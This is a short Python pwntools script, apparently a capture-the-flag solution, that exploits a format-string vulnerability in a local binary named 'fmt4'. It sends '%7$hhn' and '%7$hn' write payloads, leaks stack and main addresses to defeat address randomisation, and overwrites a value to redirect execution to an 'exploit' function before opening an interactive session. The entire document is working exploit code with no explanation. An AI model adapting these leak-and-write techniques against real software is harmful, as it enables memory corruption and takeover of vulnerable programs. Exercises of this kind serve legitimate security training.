from pwn import *

r = process("./fmt4")
e = ELF('./fmt4')
payload = '%{}x'.format(0x1e).encode()
payload += b'%7$hhn'
payload = payload.ljust(16, b'a') + b'b' * 8
payload += b'%7$p%23$p'
r.sendlineafter(b'name: ', b'c' * 8 + b'd' * 8)
r.sendlineafter(b'flag\n', payload)
print(payload)
r.recvuntil(b'b' * 8 + b'0x')
ret_addr  = int(r.recvuntil(b'0x').decode()[:-2], 16)
main_addr = int(r.recvuntil(b'\n').decode()[:-1], 16) - 106
e.address = main_addr - e.symbols['main']
#print(f'return address: 0x{ret_addr:0x}')
print(f'main address: 0x{main_addr:0x}')

payload = '%{}x'.format((e.symbols['exploit'] + 0x5e) & 0xffff).encode() + b'%7$hn'
payload = payload.ljust(0x10, b'a') 
#payload += ('%{}x'.format(0x6761 - 0x24) + '%17$n').ljust(0x10, 'a').encode()
#payload += ('%{}x'.format((0x6c66 - 0x6761 - 4)%0xffff) + '%16$hn').ljust(0x10, 'a').encode()
#payload += p64(ret_addr - 0x78)
#payload += p64(ret_addr - 0x78 + 2 )
r.sendlineafter(b'flag\n', payload)
#r.sendlineafter(b'flag\n', b'win\x00')
r.interactive()
